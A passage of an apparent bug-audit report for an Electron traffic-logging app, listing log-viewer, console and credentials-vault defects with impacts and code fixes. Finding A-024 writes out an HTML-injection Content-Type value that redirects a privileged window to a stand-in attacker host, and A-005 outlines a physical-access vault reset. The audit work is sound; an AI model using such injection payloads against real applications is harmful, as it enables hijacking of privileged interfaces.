- **Impact:** Open History for a rule with several edits. Only full JSON snapshots appear and no diff is shown.
- **Fix:** In preload.js next to getInterceptRuleHistory, add `formatInterceptRuleDiffHtml: (l, r) => ipcRenderer.invoke('format-intercept-rule-diff-html', l, r),`. If the new trusted-IPC-sender work uses an allowlist of channels, add the channel there too.
- _Reported 2× (also: x-ipc-contract)_

#### A-365 ⚪ Export/Import cancel shown as red error toast
- **Where:** `rules.js:1337` · **Category:** ux-broken · **Status:** ✅ FIXED 2026-09-23 — export/import cancel no longer shows an error toast.
- **Impact:** Click Export and press Cancel in the save dialog. A red 'Canceled' error toast appears.
- **Fix:** Return `{ ok:false, canceled:true }` from the export, import and export-rules-activity-log handlers when the dialog is canceled. In rules.js, check `if (r && r.canceled) return;` before the error branch, or skip the toast when `r.error === 'Canceled'`.

### Log viewer

#### A-019 🟠 Bundle export loses headers for encrypted rows _(WIP)_
- **Where:** `bundle-utils.js:104` · **Category:** data-loss · **Status:** open
- **Impact:** Export an incident bundle (Raw) of an encrypted session. All headers are empty in the JSON file.
- **Fix:** In parseJsonSafely, add `if (text && typeof text === 'object') return text;` before the string check, or do this in normalizeRequestRow for the header fields.

#### A-022 🟠 'Session from selection' drops all headers for encrypted rows and copies null bodies when the vault is locked _(WIP)_
- **Where:** `db.js:962` · **Category:** data-loss · **Status:** open
- **Impact:** Select 20 rows (encrypted, vault unlocked) → '+ Session from selection'. The new session's rows have no request or response headers, so cookies, curl, Editor and HAR from it are useless.
- **Fix:** In requestRowToInsertEntry, parse only strings: `const p = (h) => typeof h === 'string' ? (()=>{try{return JSON.parse(h)}catch{return null}})() : (h && typeof h === 'object' ? h : null);` and use p() for both header fields. In createSessionFromRequestIds(Async), return an error when row._locked instead of copying empty rows (or copy the *_enc columns and log_encrypted as-is). Optionally pass created_at through to insertRequest.

#### A-024 🟠 HTML/attribute injection into the privileged Network Activity window via a server-controlled Content-Type
- **Where:** `log-viewer-renderer.js:2564` · **Category:** security · **Status:** open
- **Impact:** A site returns `Content-Type: image/png"><meta http-equiv=refresh content="0,url=https://evil.example/">`. It passes _isBinaryContentType and has no ';'. The user clicks the row in Network Activity. The meta tag is inserted, the log viewer navigates to evil.example, and that page can call window.electronAPI.* as a trusted shell window.
- **Fix:** At L2555-2565, render the <img> without src in the template, then run `const img = document.getElementById('resp-img-preview'); img.src = src;`. Or validate first: `const safeMime = /^image\/[a-z0-9.+-]+$/.test(binaryMime) ? binaryMime : 'application/octet-stream'` and use safeMime for isImg, src and the ClipboardItem key. As defence in depth, in _spawnTrustedToolWindow (and _spawnRequestEditorBrowserWindow) add `win.webContents.on('will-navigate', (e, u) => { if (u !== win.webContents.getURL()) e.preventDefault(); }); win.webContents.setWindowOpenHandler(() => ({ action: 'deny' }));`. Also make isTrustedShell require the sender URL to be a file:// URL under the app root.
- _Reported 2× (also: x-security)_

#### A-025 🟠 A stale comment textarea writes the previous request's note into an unrelated request after a browser-event row is shown
- **Where:** `log-viewer-renderer.js:2705` · **Category:** data-loss · **Status:** open
- **Impact:** 1) Select HTTP request #10 whose note is "login ok". 2) Click console-event row id 42. 3) Click any other row. The requests row with id 42, an unrelated request possibly in another session, now has note "login ok".
- **Fix:** In saveCommentIfChanged and saveAnnotation, add an early return when `entry._browserEvent || entry._fromBundle || String(entry.type||'').toLowerCase()==='screenshot'`. Apply the same guard to the textarea input handler and the embed-in-note handler. In the screenshot and _browserEvent branches of showDetail, clear the panel: `if (commentTextarea) commentTextarea.value=''; if (_noteAutosaveTimer){clearTimeout(_noteAutosaveTimer);_noteAutosaveTimer=null;}`.
- _Reported 2× (also: same area)_

#### A-032 🟠 Request Editor opens with an EMPTY prefill for every encrypted log row (the default config)
- **Where:** `main-process/ipc/handlers/log-compare-execute-ipc.js:21` · **Category:** correctness · **Status:** open
- **Impact:** With the vault unlocked, select any request and click '✏ Editor' (or the context-menu 'Request Editor'). The editor opens with GET, an empty URL and no headers.
- **Fix:** In fromDbRow, write `const h = req.request_headers; headers: typeof h === 'string' ? (()=>{try{return JSON.parse(h)}catch{return {}}})() : (h && typeof h === 'object' && !Array.isArray(h) ? { ...h } : {})`. Optionally, if req._locked, pass a flag or error so the editor can show 'Vault locked'.

#### A-068 🟡 Console: switching the DB-session select back to 'Live' keeps showing the DB rows
- **Where:** `console-viewer-renderer.js:932` · **Category:** ux-broken · **Status:** ✅ FIXED 2026-09-23 — loadLiveHistory() reloads on switch back to Live.
- **Impact:** Pick an old session, then pick 'Live'. The old session's lines stay on screen, and new live lines are appended after them. Everything logged meanwhile is missing.
- **Fix:** Extract the history-loading body of the startup IIFE into `async function loadLiveHistory()`, which resets `entries = []; countAll = countMitm = countSystem = 0;`, fetches api.getConsoleHistory(), fills entries, and calls updateBadges(); rebuildFilteredIndices(). In the change handler's `if (!v)` branch call `liveMode = true; await loadLiveHistory(); return;`, and call it from the IIFE as well.

#### A-078 🟡 Set-Cookie badge and filter, site ZIP and FTS body search silently break for encrypted rows _(WIP)_
- **Where:** `db.js:1116` · **Category:** correctness · **Status:** open
- **Impact:** With default 'encrypt' mode, open a saved session and tick 'Set-Cookie only'. The list is empty, although the Cookies tab of the same rows shows Set-Cookie headers.
- **Fix:** (1) At insert time in insertRequest, store a non-sensitive `set_cookie_count INTEGER` column computed from the headers before they are encrypted, and return it from queryRequests. Make countSetCookies prefer entry.set_cookie_count when response_headers is null. (2) In the site-snapshot-export queries, also SELECT response_headers_enc, response_body_enc and log_encrypted, and pass each row through hydrateRequestLogRow before siteExportRowInfo. If the vault is locked, return a clear 'unlock vault' error. (3) Either document that FTS body search is disabled for encrypted rows or show a UI hint when the traffic log encryption mode is 'encrypt'. (4) Route updateRequest's response_headers/response_body through prepareRequestLogFields as well.

#### A-081 🟡 Imported bundle rows are overwritten with unrelated local DB rows, and annotations/Editor/Compare act on foreign ids
- **Where:** `log-viewer-renderer.js:2097` · **Category:** data-loss · **Status:** open
- **Impact:** Import a bundle exported on another machine and click a row with id 120. The detail pane shows local request #120 (a different URL, headers and bodies). Tagging it tags local #120. Editor opens local #120.
- **Fix:** In selectEntry, change L2097 to `if (entry.type !== 'screenshot' && !entry._browserEvent && !entry._fromBundle && entry.id && !entry._detailLoaded)`. At L2078/L1389, skip _fromBundle rows when adding to selectedRequestIds. In showDetail, set `canAnnotate = ... && !entry._fromBundle` and `showReplay = ... && !entry._fromBundle`, and also guard saveAnnotation/saveCommentIfChanged. Add an `_importMode` flag that is set on import and cleared when the user returns to Live or picks a session; while it is set, addEntry/_flushBatch should ignore live entries.

#### A-082 🟡 Ctrl/Cmd+A puts Activity Monitor (browser_events) ids into selectedRequestIds; 'Session from selection' then copies unrelated requests
- **Where:** `log-viewer-renderer.js:4660` · **Category:** correctness · **Status:** open
- **Impact:** The view shows 5 requests and 30 console events. Ctrl+A → '+ Session from selection'. The new session contains up to 30 random requests whose ids match the console-event ids.
- **Fix:** Add one helper, `const isSelectableRequest = en => en?.id && String(en.type||'').toLowerCase() !== 'screenshot' && !en._browserEvent && !en._fromBundle && !String(en.id).startsWith('ss-');`, and use it in the Ctrl+A loop at L4665, the shift-range at L1389 and the ctrl-click check at L1371.

#### A-083 🟡 'Export only selected request' uses the id of a browser-event or screenshot row
- **Where:** `log-viewer-renderer.js:4978` · **Category:** correctness · **Status:** open
- **Impact:** Select an exception row (id 7) → Bundle → OK (selected only). The bundle contains requests row #7 from some other page or session.
- **Fix:** Before the confirm, use `const canSelectOnly = selected && selected.id && !selected._browserEvent && !selected._fromBundle && String(selected.type||'').toLowerCase() !== 'screenshot' && Number.isFinite(Number(selected.id));` and show the 'Export only selected request?' confirm only when canSelectOnly is true. Otherwise export the whole session.

#### A-084 🟡 All 'Copy image' buttons always fail because fetch('data:…') is blocked by the window CSP
- **Where:** `log-viewer-renderer.js:2206` · **Category:** ux-broken · **Status:** open
- **Impact:** Open a screenshot row or a PNG response → '⎘ Copy image'. The button always shows '✗ Failed' and nothing reaches the clipboard.
- **Fix:** Replace the `fetch(dataUrl).then(r=>r.blob())` calls with a local decode: `const bin = atob(b64); const u8 = Uint8Array.from(bin, c => c.charCodeAt(0)); const blob = new Blob([u8], {type: mime});`. For any mime other than image/png, draw the image to a canvas and use canvas.toBlob(..., 'image/png'), then write `new ClipboardItem({'image/png': pngBlob})`. The alternative is adding `connect-src 'self' data:` to the log-viewer CSP (the PNG conversion is still needed for other formats).

#### A-085 🟡 'Copy as curl' produces a shell-syntax-broken command for any value containing a single quote and corrupts backslashes in bodies
- **Where:** `log-viewer-renderer.js:1079` · **Category:** correctness · **Status:** open
- **Impact:** Checked with bash -n: a URL `?q=it's` or a body `{"d":"it's"}` gives 'unexpected EOF while looking for matching quote'. A body `{"a":"b\"c"}` is sent as `{"a":"b\\"c"}`.
- **Fix:** Use `const sq = s => "'" + String(s).replace(/'/g, "'\\''") + "'";` (JS source `"'\\''"` yields `'\''`). Build `curl -v -X ${method} ${sq(url)}`, headers as `-H ${sq(k + ': ' + v)}`, and the body as `--data-raw ${sq(body)}` with no backslash doubling. For binary bodies, leave out --data-raw and append a shell comment such as `# binary body omitted; save it from the Request body tab and use --data-binary @file`.

#### A-086 🟡 Selecting an HTTP row after a browser-event row leaves the stale Event pane active
- **Where:** `log-viewer-renderer.js:2654` · **Category:** ux-broken · **Status:** open
- **Impact:** Click a console-event row, then click a normal GET row. The detail area shows 'Summary: … Source: …' from the console event instead of Headers.
- **Fix:** Delete the line `lastActiveTab = 'event';` at L2276 (activateTab('event', false) already leaves lastActiveTab alone), so the next HTTP row restores the user's last HTTP tab. As a defensive addition in the HTTP branch before L2651: `if (lastActiveTab === 'event') lastActiveTab = 'headers';`.

#### A-087 🟡 Live-entry cap: past 10000 entries every 80 ms flush wipes the selection, and in historical-session windows it evicts the historical rows _(WIP)_
- **Where:** `log-viewer-renderer.js:1639` · **Category:** correctness · **Status:** open
- **Impact:** Open session #12 (4000 rows) in a second window while live browsing produces 7000 entries. The trim drops the oldest historical rows from session #12's view. In the live window with 10000+ rows, Shift-selecting a range is cleared within 80 ms.
- **Fix:** In _flushBatch: (a) `if (activeSidebarId !== null) { /* viewing a historical session */ skip allEntries.push for entries whose session_id/sessionId != sessionFilterMode (or ignore the live batch entirely) }`. (b) Trim with hysteresis, e.g. `if (allEntries.length > MAX_LIVE_ENTRIES) { const keep = Math.floor(MAX_LIVE_ENTRIES*0.9); const removed = new Set(allEntries.splice(0, allEntries.length-keep)); ... }`. (c) Remap selection by identity: `const selEntry = filteredEntries[selectedIndex]; filteredEntries = filteredEntries.filter(e => !removed.has(e)); selectedIndex = selEntry ? filteredEntries.indexOf(selEntry) : -1;` and keep selectedRequestIds, dropping only ids of removed entries. When FTS is active (ftsCheckbox.checked && q), filter the existing filteredEntries instead of rebuilding from entryPassesFilter.

#### A-088 🟡 FTS search: queries all sessions in live mode, bypasses type/status/tab/session filters, drops colliding browser events, and live rows leak into results
- **Where:** `log-viewer-renderer.js:1752` · **Category:** correctness · **Status:** open
- **Impact:** In LIVE, tick FTS and search 'token'. Results include requests from sessions recorded weeks ago. Selecting 'Status: 5xx' has no effect. A console event with id 55 disappears if request 55 matched.
- **Fix:** In applyFilters: `const gen = ++_filterGen;` then after the await `if (gen !== _filterGen) return;`. Pass `activeSidebarId ?? currentSrvSessId` as the session id instead of currentSessionId. Filter the FTS rows with a variant of entryPassesFilter that skips the URL-substring clause (e.g. entryPassesFilter(e, { skipQuery: true })). Dedupe with key `(e._browserEvent ? 'be:' : 'rq:') + e.id` (for FTS rows, which are always requests, check only against 'rq:' keys, so events are never dropped by a request-id match). In _flushBatch, when `ftsCheckbox?.checked && searchInput.value.trim()`, do not push into filteredEntries (or schedule a debounced applyFilters).

#### A-089 🟡 The viewer ignores session changes pushed in update-log-status, so the live view mixes sessions and the LIVE badge goes stale
- **Where:** `log-viewer-renderer.js:158` · **Category:** correctness · **Status:** open
- **Impact:** Log viewer open in LIVE; press Rec in the main window and choose 'New session'. The list keeps the old session's 500 rows and appends new ones, and the sidebar still marks the old session LIVE.
- **Fix:** In api.onUpdateLogStatus: `const sid = data?.sessionId ?? null; if (sid != null && sid !== currentSrvSessId) { loadSessionSidebar().then(() => { if (activeSidebarId === null) activateSidebarSession(sid, true); }); }`. currentSrvSessId is updated inside loadSessionSidebar, and _activatingSession already guards against re-entry.

#### A-090 🟡 Clear while viewing a historical session leaves currentSessionId on the old session
- **Where:** `log-viewer-renderer.js:4683` · **Category:** correctness · **Status:** open
- **Impact:** Open session #5 from the sidebar → Clear → browse → ⬇ HAR. The file is cupnet-session-5.har with session #5's data instead of the live session.
- **Fix:** In the Clear handler, after `await loadSessionSidebar();`, call `await activateSidebarSession(currentSrvSessId, true);`. Alternatively, set `currentSessionId = null; autoScrollEnabled = true; autoScrollBtn?.classList.add('active'); if (autoScrollBtn) autoScrollBtn.textContent = '↓ Live';` alongside the other resets.

#### A-091 🟡 Memory leak: full request/response bodies stay on every inspected entry
- **Where:** `log-viewer-renderer.js:2085` · **Category:** leak · **Status:** open
- **Impact:** Click through 200 large HTML or JSON responses. The renderer heap grows by the sum of all bodies and never shrinks.
- **Fix:** Track the loaded entry directly: `let _detailHeldEntry = null;`. In selectEntry, before loading a new one, run `if (_detailHeldEntry && _detailHeldEntry !== entry) { const p = _detailHeldEntry; delete p.requestBody; delete p.responseBody; delete p.request_body; delete p.request_headers; if (String(p.type||'').toLowerCase() !== 'cupnet') delete p.response_body; p._detailLoaded = false; }`, then set `_detailHeldEntry = entry` after the detail merge. Do not delete response_headers, because the list row already has it. A cleaner alternative is to keep the detail in a separate single-slot cache and render from that rather than mutating the list entry.

#### A-092 🟡 The in-tab find steals keyboard focus into the comment textarea on every selection
- **Where:** `log-viewer-renderer.js:4374` · **Category:** ux-broken · **Status:** open
- **Impact:** Type 'id' in the find bar, open the Comment tab, click the list and press ↓. After one row, focus jumps into the textarea and further ↓ presses no longer change rows.
- **Fix:** Add a `focus` option to focusDetailFindMatch(index, { scroll = true, focus = false } = {}). In textarea mode call commentTextarea.focus() only when focus is true (setSelectionRange/scrollTop can still be applied without focus). Pass { focus: true } only from stepDetailFind (Enter/F3/prev/next buttons). Leave refreshDetailFind (both the automatic scheduleDetailFindRefresh path and the input-debounce path) without focus.

#### A-215 ⚪ Compare: an async renderDetail with no generation guard lets an older render overwrite a newer one
- **Where:** `compare-viewer-renderer.js:348` · **Category:** race · **Status:** open
- **Impact:** Click pair #1 (large JSON), then quickly pair #2 (small). #2 renders, then #1's delayed render replaces it while #2 is still highlighted.
- **Fix:** Add `let _detailGen = 0;` at module scope. At the top of renderDetail, add `const gen = ++_detailGen;`. After each `await api.formatJsonDiffHtml(...)`, add `if (gen !== _detailGen) return;`. The synchronous early-return branches need no change because they bump the generation on entry.

#### A-216 ⚪ Console: a duplicate row is added at the trim boundary
- **Where:** `console-viewer-renderer.js:394` · **Category:** correctness · **Status:** open
- **Impact:** At the 50001st line, the newest line is rendered twice and the 'Visible' count is off by one until the next rebuild.
- **Fix:** Make trimEntriesIfNeeded return true when it trimmed/rebuilt (false otherwise). In addEntry: `const rebuilt = trimEntriesIfNeeded();`. Then only do the incremental `filteredIdx.push(entries.length - 1)` when `!rebuilt`, still calling updateStatusBar/render as today.

#### A-217 ⚪ Console: correlate always queries the live session, and results cannot be opened
- **Where:** `console-viewer-renderer.js:848` · **Category:** ipc-contract · **Status:** open
- **Impact:** View console logs of session #4 → correlate on a line. The window shows requests from the current live session at that timestamp (usually none), not from session #4.
- **Fix:** In correlateEntry, pass `sessionId: (!liveMode && dbSessionSelect?.value) ? Number(dbSessionSelect.value) : undefined` to findRequestsNearTs. In the a[data-req] click handler, replace the clipboard write with `api.openLogViewerFocusRequest?.(Number(id))`, optionally keeping the clipboard write as a fallback.

#### A-218 ⚪ Console: bookmarks keyed by a non-stable seq attach to unrelated lines
- **Where:** `console-viewer-renderer.js:183` · **Category:** data-loss · **Status:** open
- **Impact:** Bookmark live line #12, reopen the console. Whatever line now has seq 12 is starred, and DB row id 12 in any session is also starred.
- **Fix:** Key bookmarks by a stable identity. The minimal renderer-only fix is to key them by `${entry.tsMs}:${hash(entry.text)}` (store strings, bump BM_KEY to v2), keeping seq only for in-memory context-menu lookup. A more complete fix is to assign a monotonic id in console-capture.js per process run, prefixed with a boot id, and persist it with the DB row.

#### A-219 ⚪ Console: wrap mode renders the OLDEST 4000 lines and hides the live tail
- **Where:** `console-viewer-renderer.js:530` · **Category:** ux-broken · **Status:** ✅ FIXED 2026-09-23 — wrap mode renders the last WRAP_MAX_ROWS and follows the tail.
- **Impact:** Enable Wrap with 20k lines. The view shows lines 1-4000 from an hour ago, and new MITM lines never appear.
- **Fix:** In renderWrapMode, set `const start = Math.max(0, filteredIdx.length - WRAP_MAX_ROWS)` and loop fi from start to filteredIdx.length. Change the status text to 'showing last'. Change L405 to `if (autoScroll) scrollToBottom();` so wrap mode also follows the tail.

#### A-220 ⚪ Console: search highlighting runs on escaped HTML and ignores regex mode
- **Where:** `console-viewer-renderer.js:229` · **Category:** correctness · **Status:** open
- **Impact:** Search 'amp' in a line containing 'a&b'. The line renders as 'a&amp;b'. With regex '\d+', nothing is highlighted although lines match.
- **Fix:** Rewrite highlightSearch(rawText, term). Build `re = useRegex ? new RegExp(term, 'gi') : new RegExp(escapeRegex(term), 'gi')`, falling back to the literal form if the RegExp is invalid. Walk the matches with re.exec, guarding zero-length matches by advancing lastIndex. Emit escapeHtml(nonMatch) + '<span class="cv-highlight">' + escapeHtml(match) + '</span>' for each segment. Call it as `msg.innerHTML = highlightSearch(entry.text, searchTerm)`.

#### A-221 ⚪ Console: lines are duplicated when the window opens (live batch plus history snapshot)
- **Where:** `console-viewer-renderer.js:996` · **Category:** race · **Status:** open
- **Impact:** Open System Console during MITM activity. The last several lines appear twice, first at the top and again at the end of the history block.
- **Fix:** In the IIFE, set a flag `historyLoaded=false`. In onConsoleLog, while !historyLoaded, push incoming items into a `pendingLive` array instead of calling addEntry. After the history is appended, set historyLoaded=true. Then replay pendingLive, skipping items whose (ts,text,stream) key appears in the history snapshot (or with ts <= the last history ts and the same text). Simpler option: fetch getConsoleHistory() first, before the other awaits, and dedupe replayed live items by (ts,text,stream).

#### A-222 ⚪ Console: the DB session view loads only the OLDEST 5000 lines
- **Where:** `console-viewer-renderer.js:942` · **Category:** correctness · **Status:** ✅ FIXED 2026-09-23 — DB-session view fetches newest 5000 (order desc) and reverses to chronological.
- **Impact:** A session with 40k console lines: the viewer shows the first 5000 startup lines only.
- **Fix:** Call with order:'desc' (limit 5000) and reverse the rows before the loop at line 947. Then, if the selected session's console_count > rows.length, show a notice such as `Showing latest ${rows.length} of ${count} lines` (for example in stRange/countEl). Optionally add a 'Load older' button that re-queries with offset += 5000.

#### A-223 ⚪ Console: O(N) work per incoming line at 50k lines
- **Where:** `console-viewer-renderer.js:329` · **Category:** perf · **Status:** open
- **Impact:** With MITM debug level 3 producing hundreds of lines per second and 50k entries buffered, the console window pegs a CPU core and becomes unresponsive.
- **Fix:** Keep a `bookmarkCount` that is updated in the bookmark toggle and trim paths instead of looping in updateBadges. In rebuildFilteredIndices, compute parseTimeBounds() and the compiled search RegExp once and pass them into entryMatchesFilters. In onConsoleLog, add all entries first with rendering suppressed, then call renderVirtual/updateBadges/updateStatusBar once, or schedule one requestAnimationFrame render. In the group-repeat branch, update only the last row's repeat badge instead of calling rebuildFilteredIndices().

#### A-246 ⚪ Copy as curl from the context menu on a multi-selected row omits headers and body
- **Where:** `log-viewer-renderer.js:5360` · **Category:** correctness · **Status:** open
- **Impact:** Shift-select 3 historical rows, right-click the middle one → Copy as curl. The command has no -H headers and no --data-raw.
- **Fix:** In the menu click handler's 'curl' branch: `let e2 = entry; if (!e2._detailLoaded && Number.isFinite(id) && !e2.request_headers) { try { const full = await api.getRequestDetail(id); if (full) e2 = { ...entry, ...normalizeRequestDetailRow(full) }; } catch {} } const text = buildCurlCommand(e2);` (make the handler async or wrap it in an async IIFE). Merging into a copy avoids the body-cleanup bookkeeping that selectEntry does.

#### A-247 ⚪ Live batches arriving during init or session activation are duplicated and out of order
- **Where:** `log-viewer-renderer.js:2019` · **Category:** race · **Status:** open
- **Impact:** Open Network Activity while a page is loading. The last few requests appear twice, and the first rows of the list are the newest ones followed by the older history.
- **Fix:** Keep a Set of keys (`${e._browserEvent?'be':e.type==='screenshot'?'ss':'rq'}:${e.id}`) that is rebuilt whenever allEntries is reset. Skip entries whose key is already present, both in _flushBatch and when pushing DB results in init() and activateSidebarSession(). Also add a `_loadingEntries` flag: while it is set, _flushBatch leaves _batchQueue alone (re-arms the timer), and after the DB rows are pushed, clear the flag and flush so live rows land after the history and are deduped.

#### A-248 ⚪ Deleting the session currently being viewed does not reset the list
- **Where:** `log-viewer-renderer.js:1895` · **Category:** correctness · **Status:** open
- **Impact:** View session #9 and delete it. The rows remain visible, the sidebar highlights LIVE, and HAR export produces an empty file for session 9.
- **Fix:** In both handlers, remember `const wasViewing = activeSidebarId === s.id` (or the some() check for unnamed sessions). After `await loadSessionSidebar();`, run `if (wasViewing) await activateSidebarSession(currentSrvSessId, true);` in place of the bare assignments to sessionFilterMode and activeSidebarId.

#### A-249 ⚪ Async screenshot and WS-messages loads have no stale-response guard
- **Where:** `log-viewer-renderer.js:2222` · **Category:** race · **Status:** open
- **Impact:** Click screenshot A (large) then quickly screenshot B. A's image arrives last and is shown under B's metadata. The same happens with WS rows: the Messages tab shows the previous socket's frames.
- **Fix:** In the screenshot branch, capture `const e = entry` and in renderSS and the catch add `if (_currentDetailEntry !== e) return;`. In loadWsMessagesPanel, add `const gen = ++_wsMsgGen;` at the top and `if (gen !== _wsMsgGen || _currentDetailEntry !== entry) return;` after the await (in both the success and catch paths). Optionally skip the reload in activateTab when `_wsMessagesCopyPayload?.entryId === entry.id` and the refresh was not user-initiated.

#### A-250 ⚪ focus-request-id / focus-request-url are lost when the log viewer is freshly opened
- **Where:** `log-viewer-renderer.js:5075` · **Category:** race · **Status:** open
- **Impact:** From Notes, click 'open request #123' with no Network Activity window open. The window opens but no row is selected.
- **Fix:** Store the request in a module variable (`let _pendingFocus = {id}|{url}`) when entries are not loaded yet (for example an `_initDone` flag that is false). At the end of init(), after applyFilters/activateSidebarSession, apply it: for id, find it in filteredEntries and selectEntry; for url, selectEntry(0) if filteredEntries is non-empty. Optionally, if the id is still missing, call api.getRequestDetail(id) and activateSidebarSession(row.session_id) before selecting.

#### A-251 ⚪ Escape in the session rename input commits the edited name instead of reverting
- **Where:** `log-viewer-renderer.js:1986` · **Category:** correctness · **Status:** open
- **Impact:** Click ✎, type 'xyz', press Escape. The session is renamed to 'xyz'.
- **Fix:** Add `let cancelled = false;` and change the handler to `if (e.key === 'Escape') { e.preventDefault(); cancelled = true; input.blur(); }`. At the top of commit, add `if (cancelled) { renderSessionList(); return; }`.

#### A-252 ⚪ Context menu 'Request Editor' disabled state never applies (duplicate class attribute)
- **Where:** `log-viewer-renderer.js:5345` · **Category:** ux-broken · **Status:** open
- **Impact:** A row with a non-numeric id shows an enabled 'Request Editor' item that silently does nothing.
- **Fix:** Line 5345: `<div class="wrt-ctx-menu-item${Number.isFinite(id) ? '' : ' disabled'}" data-action="editor">Request Editor</div>`

#### A-253 ⚪ HAR export failures are silently ignored
- **Where:** `log-viewer-renderer.js:4696` · **Category:** error-handling · **Status:** open
- **Impact:** Export to a read-only folder. The button resets and the user assumes the HAR was written.
- **Fix:** Add a `catch (err) { alert('HAR export failed: ' + (err?.message || err)); }` block, plus `else if (res && !res.success && !res.canceled) alert('HAR export failed: ' + (res.error || 'unknown error'));`. Optionally make the stream export awaitable so write errors are reported.

#### A-254 ⚪ HTML-form '✏ Submit' prefill builds a URL-encoded body with a multipart Content-Type, and GET appends to the existing query
- **Where:** `log-viewer-renderer.js:3314` · **Category:** correctness · **Status:** open
- **Impact:** A login form with enctype multipart/form-data → Submit → Send in the Request Editor. The server returns 400 (no boundary).
- **Fix:** In buildHtmlFormEditorPrefill: for GET use `const u = new URL(actionUrl); u.search = bodyStr; return {method, url: u.href, headers:{}, body:''}` (with a try/catch fallback). For multipart, either emit Content-Type 'application/x-www-form-urlencoded', or add a `multipart: params.map(([k,v])=>({key:k,value:v}))` field and teach initFromData to set state.bodyType='form-data' and fill state.multipart when the content type includes 'multipart/form-data', without adding the header, because the send path sets it from requestEditorBuildMultipart. For text/plain, use 'application/x-www-form-urlencoded' as well.

#### A-255 ⚪ Activity filter 'Clear filter' hides all activity rows
- **Where:** `log-viewer-renderer.js:1695` · **Category:** ux-broken · **Status:** open
- **Impact:** Open the Activity dropdown → Clear filter. All console, exception and storage rows vanish.
- **Fix:** In setupMultiSelect, accept an optional `defaults` array. For the activity dropdown, have Clear re-check all boxes and refill selSet with ['console','exception','storage','csp'] instead of clearing (syncMsBadge with selSet.size). Or treat size===0 as 'all' at :1692-1696 by dropping the else branch.

#### A-256 ⚪ Russian UI strings and a wrong label violate the English-UI rule
- **Where:** `log-viewer-renderer.js:1033` · **Category:** ux-broken · **Status:** open
- **Impact:** An English-speaking user expands a long WS message and sees 'Развернуть'.
- **Fix:** Change :506-507 to 'System row: proxy selected' / 'System row: direct traffic'. :1033/:1056 → 'Expand', :1061 → 'Collapse'. :4512 → 'Select a WebSocket (handshake) row in the log.', :4516 → 'No messages loaded. Open the Messages tab or click Refresh.', :4522 → 'The list is stale. Click Refresh.', :4535 → 'Copy failed: ' + ... . :574 'Tapping' → 'Typing'.

#### A-257 ⚪ The response size label shows the character count as KB
- **Where:** `log-viewer-renderer.js:2540` · **Category:** correctness · **Status:** open
- **Impact:** A 30 KB Cyrillic HTML page (UTF-8) is shown as about 15 KB.
- **Fix:** At line 2540 replace the expression with `formatFileSize(new TextEncoder().encode(respBody).length)` (optionally prefer a numeric Content-Length header when present).

#### A-316 ⚪ The Rec confirm modal is positioned with log-viewer coordinates relative to the main window
- **Where:** `main-process/services/sub-windows.js:763` · **Category:** ux-broken · **Status:** open
- **Impact:** Log viewer on a second monitor → Stop → Rec. The 'continue or new session' modal pops up on the main window's monitor at a random offset.
- **Fix:** In db-logging-ipc.js change the handler to `async (event, hint)` and pass `BrowserWindow.fromWebContents(event.sender)` to createLoggingModalWindow(data, hint, originWin). In sub-windows.js use `const base = (originWin && !originWin.isDestroyed()) ? originWin : d.mainWindow;` for both getPosition()/getSize() and `parent`. Add screen.getDisplayMatching clamping so the modal stays inside the work area.

### Credentials vault

#### A-005 🔴 profile-complete-setup replaces an existing vault's verify blob without the old master password and orphans all its data _(WIP)_
- **Where:** `main-process/ipc/handlers/profile-ipc.js:220` · **Category:** security · **Status:** open
- **Impact:** (1) A legacy user opens the new build, is forced into 'Complete setup' for the primary vault, and enters a password. All stored passwords, extras and custom fields are now undecryptable. (2) Someone with physical access deletes or corrupts userData/profile-migration-state.json, or picks a 'Default'-named vault while setup mode is active. They can reset that vault's password without knowing the old one, destroying its data.
- **Fix:** In profile-complete-setup, only accept a vaultId equal to migration.primaryVaultId, or getPrimaryVaultId(db) when that is null. Ignore any other payload.legacyVaultId. When that vault already has a verify_blob, require payload.currentPassword, check it through vaultSession's rate limiter with verifyVaultPassword, and then re-key in one transaction: decrypt every CV01/CV02 field with the old password or key, re-encrypt with the key from the new blob, and swap verify_blob in the same transaction. The alternative is to keep the existing blob and treat setup as a rename plus sign-in with the existing password. The setup UI needs a 'Current password' input for this.

#### A-006 🔴 Legacy CV01 credential fields are never readable or migrated after the password is dropped _(WIP)_
- **Where:** `main-process/services/credentials-vault-crypto.js:24` · **Category:** data-loss · **Status:** open
- **Impact:** A user upgrades from HEAD, where every field is CV01 scrypt(masterPassword). After unlocking, every item shows an empty password, card/identity data, TOTP and custom fields. Autofill fills an empty password. An export writes empty passwords.
- **Fix:** Add migrateCv01CredentialFields(db, vaultId, password, key) and call it from _unlockVaultRecord and finishProfileLogin, after the (fixed) session key is set and while `password` is still in scope. Run it inside db.getDb().transaction(). For every credentials row of the vault, trashed rows included, and every credential_custom_fields row: if a buffer starts with MAGIC_CV01, run decryptCredentialField(buf, password) and write encryptCredentialFieldWithKey(plain, key). If any decrypt fails, skip that field and leave its ciphertext untouched. Never write ''.

#### A-007 🔴 CV01->CV02 verify-blob upgrade changes the session key, so data written in the first session can never be decrypted again _(WIP)_
- **Where:** `main-process/services/vault-session-service.js:141` · **Category:** data-loss · **Status:** open
- **Impact:** A HEAD user has a secondary vault with a CV01 verify blob and signs in (profile-login, or credentials-unlock / toolbar unlock). migratePlaintextCredentialFields runs in that same call: it encrypts login/notes into *_encrypted with the old-salt key and blanks the plaintext columns. Every save/capture/import in that session is also CV02 with that key. After the app restarts, every one of those usernames, notes, passwords and custom fields decrypts to '' and is permanently lost.
- **Fix:** In vault-session-service.unlockVault, when !isCv02Blob(verifyBlob), create the upgraded blob before deriving the key and take the key from the new blob's salt: `upgraded = await createVaultVerifyBlob(password); key = await deriveMasterKey(password, upgraded.subarray(5,21));`. Otherwise derive from verifyBlob as today. Callers must persist upgradedVerifyBlob before any field is encrypted (they already do this before the migrate* calls), ideally inside the same DB transaction as the field migration. A simpler alternative is to keep the old salt: build the CV02 blob as MAGIC_CV02|2|verifyBlob.subarray(5,21)|AES-GCM(Argon2id(pw, oldSalt), VAULT_MARKER), so the key does not change.

#### A-020 🟠 window.prompt() is used for export password, vault switch, vault delete and folder names, but Electron does not support it
- **Where:** `credentials-renderer.js:1356` · **Category:** ux-broken · **Status:** open
- **Impact:** The user clicks 'Export vault' and nothing happens. The user clicks 'New folder' and nothing happens. The user picks a locked vault in the switcher: the selection snaps back and it cannot be unlocked from there.
